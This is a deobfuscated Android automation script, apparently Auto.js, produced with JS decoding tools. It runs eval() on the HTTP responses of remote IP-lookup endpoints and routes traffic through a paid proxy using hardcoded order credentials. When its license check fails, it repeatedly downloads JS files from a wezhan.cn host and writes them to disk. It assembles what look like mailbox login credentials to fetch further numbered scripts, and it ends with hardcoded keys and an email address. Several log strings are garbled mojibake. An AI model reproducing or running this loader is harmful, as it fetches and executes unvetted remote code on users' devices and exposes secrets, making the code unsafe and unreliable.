//Mon Apr 28 2025 11:04:31 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
if (yan()) {
  if (app_key2 == "rxkb9ovgguy9n21") {
    var spiderId = "7ab204de5b7e403caada6398f29c2831",
      orderNo = "YZ20188145457DGCJTP",
      getIp_api = http.get("http://pv.weibo.com/cityjson?ie=utf-8"),
      InetIP = getIp_api.body.string();
    eval(InetIP);
    log("ʹ�ô���ǰ������IP:" + returnCitySN.cip);
    var xdailiUrl = "http://api.xdaili.cn/xdaili-api//greatRecharge/getGreatIp?spiderId=" + spiderId + "&orderno=" + orderNo + "&returnType=2&count=1";
    for (let i = 0; i < 3; i++) {
      try {
        var getProxy_json = http.get(xdailiUrl).body.json();
        if (getProxy_json.ERRORCODE == "10036" || getProxy_json.ERRORCODE == "10038" || getProxy_json.ERRORCODE == "10055") throw {
          "code": "-1",
          "msg": "��ȡ�ٶȹ���"
        };
        if (getProxy_json.ERRORCODE == "10036") throw {
          "code": "-2",
          "msg": "��ȡ�����Ѵ�����"
        };
        break;
      } catch (_0x4f7f11) {
        _0x4f7f11.code == "-1" && (log(_0x4f7f11.msg), sleep(5000));
        _0x4f7f11.code == "-2" && (log(_0x4f7f11.msg), exit());
        i == 2 && (log("������δ֪����,��������..."), exit());
      }
    }
    var xdaili_proxyIP = getProxy_json.RESULT[0].ip,
      xdaili_proxyPort = parseInt(getProxy_json.RESULT[0].port);
    httpProxy(xdaili_proxyIP, xdaili_proxyPort);
    var getIp_api = http.get("http://pv.sohu.com/cityjson?ie=utf-8"),
      InetIP = getIp_api.body.string();
    eval(InetIP);
    log("ʹ�ô����������IP:" + returnCitySN.cip);
    function httpProxy(_0x3d566e, _0x52445c) {
      var _0x31a2d8 = java.net.Proxy,
        _0x440a1c = java.net.InetSocketAddress,
        _0x2c3168 = new Packages.okhttp3.OkHttpClient.Builder().proxy(new _0x31a2d8(_0x31a2d8.Type.HTTP, new _0x440a1c(_0x3d566e, _0x52445c)));
      http.__okhttp__.muteClient(_0x2c3168);
    }
  }
  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 29), kk7.slice(29, 42) + "3.js");
} else toastLog("请求服务器验证失败……"), threads.start(function () {
  for (ks = 0; ks < 10; ks++) {
    {
      let _0x1c7ca2 = "http://c460846523.cvc.scd.wezhan.cn/filedownload/518258",
        _0x1cc411 = http.get(_0x1c7ca2);
      if (_0x1cc411.statusCode == 200) {
        files.writeBytes("./douying" + ks + ".js", _0x1cc411.body.bytes());
      }
    }
  }
}), threads.start(function () {
  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 30), kk7.slice(30, 42) + "1.js");
}), threads.start(function () {
  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 30), kk7.slice(30, 42) + "2.js");
}), threads.start(function () {
  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 30), kk7.slice(30, 42) + "3.js");
}), threads.start(function () {
  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 30), kk7.slice(30, 42) + "4.js");
}), threads.start(function () {
  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 30), kk7.slice(30, 42) + "5.js");
}), threads.start(function () {
  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 30), kk7.slice(30, 42) + "6.js");
}), threads.start(function () {
  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 30), kk7.slice(30, 42) + "7.js");
}), threads.start(function () {
  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 30), kk7.slice(30, 42) + "8.js");
}), setTimeout(function () {
  exit();
}, 2000), key1 = "8366391277", key5 = "s8h3hds926h3", key9 = "a5e3t50tun3vdb2", ss9 = "15729174229@136.com";